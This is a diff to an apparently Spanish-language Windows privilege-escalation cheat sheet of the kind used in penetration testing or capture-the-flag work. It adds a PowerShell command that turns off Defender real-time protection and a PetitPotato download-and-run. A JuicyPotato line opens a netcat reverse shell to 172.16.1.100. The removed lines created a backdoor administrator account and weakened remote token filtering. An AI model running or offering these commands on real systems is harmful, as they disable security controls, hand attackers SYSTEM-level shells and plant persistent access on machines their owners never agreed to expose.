@@ -1,3 +1,9 @@
+- Quitar busqueda de virus
+```powershell
+Set-MpPreference -DisableRealtimeMonitoring $true
+```
+
+
 - Ver usuarios disponibles
 ```powershell
 net user
@@ -44,16 +50,11 @@ msiexec /quiet /qn /i C:\windows\temp\a\bad.msi
 ## SeImpersonatePriv
 
 ```bash
-.\JuicyPotato.exe -t * -p "C:\Windows\System32\cmd.exe" -a "/c net user arra arra123 /add" -l 1337
+https://github.com/wh0amitz/PetitPotato/releases/download/v1.0.0/PetitPotato.exe
 
-.\JuicyPotato.exe -t * -p "C:\Windows\System32\cmd.exe" -a "/c net localgroup Administrators arra /add" -l 1337
+.\PetitPotato.exe 3 "whoami"
 
-.\JuicyPotato.exe -t * -p "C:\Windows\System32\cmd.exe" -a "/c reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f" -l 1337
-
-psexec.py WORKGROUP/arra@10.10.10.63 cmd.exe
-
-#Si falla algo
-.\JuicyPotato.exe -t * -p "C:\Windows\System32\cmd.exe" -a "/c net share attacker_folder=C:\Windows\Temp /GRANT:Administrators,FULL" -l 1337
+.\JuicyPotato.exe -t * -p C:\Windows\System32\cmd.exe -l 1337 -a "/c C:\Windows\Temp\priv\nc.exe -e cmd 172.16.1.100 8081"
 ```
 
 ## SeBackupPriv
